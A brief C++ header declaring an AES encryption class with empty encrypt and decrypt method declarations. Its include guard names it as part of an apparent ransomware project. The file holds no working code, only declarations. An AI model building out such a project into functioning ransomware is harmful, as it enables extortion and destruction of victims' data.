//
// Created on 23.01.20.
//

#ifndef RANSOMWARE_AES_ALGO_H
#define RANSOMWARE_AES_ALGO_H

#include <openssl/aes.h>

#include "algorithm.h"

class AESAlgorithm : public Algorithm {

public:
    AESAlgorithm();
    ~AESAlgorithm();

    void encrypt();
    void decrypt();

};


#endif //RANSOMWARE_AES_ALGO_H
